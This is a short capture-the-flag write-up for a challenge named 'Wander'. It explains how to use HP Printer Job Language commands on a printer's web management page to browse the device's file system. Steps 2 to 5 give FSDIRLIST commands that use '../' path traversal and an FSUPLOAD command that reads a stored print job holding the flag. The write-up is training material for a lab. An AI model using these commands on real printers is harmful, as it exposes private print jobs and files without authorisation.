
# WANDER
## CHALLENGE DESCRIPTION
My uncle isn't allowing me to print documents. He's off to vacation and I need a PIN to unlock this printer. All I found is a web server where this printer is managed from. Can you help me with this situation ?

### STEPS
1. Paste the IP Address in the web browser and you will directed to the Wander page. 
### ![ab](https://github.com/user-attachments/assets/e656bfb5-ce84-471b-b9f2-326c7a790a33)


2. Printer Job Language (PJL) was developed by Hewlett-Packard to provide a method for switching printer languages at the job level, and for status readback between the printer and the host computer.
     >  @PJL FSDIRLIST NAME="0:" ENTRY=1  : this command is used to list the content of the current directory 
### ![ab](https://github.com/user-attachments/assets/64dffb2f-1c38-4eed-83e3-4b619c557389)


3. To view the upper directory, use this command :
      > @PJL FSDIRLIST NAME="0:/../" ENTRY=1

### ![ab](https://github.com/user-attachments/assets/47218e0c-5ac9-4561-a101-1ebd4ba39048)


4. Inside the default directory there is a file called readyjob, to see the content use this command
      > @PJL FSDIRLIST NAME="0:/../home/default" ENTRY=1

### ![ab](https://github.com/user-attachments/assets/9c7cc37e-fe60-42e6-8760-8fe647b30b74)


5. To get the flag use this command
      > @PJL FSUPLOAD NAME="0:/../home/default/readyjob"

### ![ab](https://github.com/user-attachments/assets/859a456c-4e0b-417d-b0f7-e704f841b251)


